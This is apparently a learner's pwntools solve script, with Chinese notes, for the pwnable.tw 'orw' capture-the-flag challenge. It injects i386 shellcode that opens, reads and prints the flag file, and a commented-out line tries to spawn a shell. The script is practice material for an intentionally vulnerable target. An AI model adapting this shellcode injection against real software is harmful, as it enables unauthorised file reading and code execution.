#/usr/bin/python
#-*-coding:utf-8-*-
import sys
from pwn import *
host="chall.pwnable.tw"
port=10001
#p=remote()
print sys.argv
if(len(sys.argv)>1):
    p=remote(host,port)
else:
    p=process("orw")
print p.recv()
'''
伪代码：
char *file="home/orw/flag"
sys_open(file,0,0)
sys_read(3,file,0x30)
sys_write(1,file,0x30)
现在我明白1,3,0之类的都是输入输出句柄之类的

text:0804858A                 call    eax ; shellcode
没有system之类给我们用


tips说

Read the flag from /home/orw/flag.

Only open read write syscall are allowed to use.

nc chall.pwnable.tw 10001

但是凭什么啊，为什么仅仅能使用这些呢，开了怎么样的保护机制

'''
#？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
#这个payload不能用，原因应该是某种机制限制了sys_exec
# pay=asm(shellcraft.i386.sh())
# f=open("input.txt","w")
# f.write(pay)
# f.close()
# p.sendline(pay)
# p.interactive()

shellcode = ''
shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
shellcode += asm('xchg ecx,ebx;mov bl,0x3;mov dl,0x30;int 0x80;')
shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')

#这一段汇编还是要深入研究一下的
asm_me='''\
xor ecx,ecx;
mov eax,0x5;
push ecx;
push 0x67616c66;
push 0x2f77726f;
push 0x2f656d6f;
push 0x682f2f2f;
mov ebx,esp;
xor edx,edx;
int 0x80;
xchg ecx,ebx;
mov bl,0x3;
mov dl,0x30;
int 0x80;
mov eax,0x4;
mov bl,0x1;
int 0x80;
'''
sc=asm(asm_me)
#print sc
p.sendline(sc)
print p.recv()
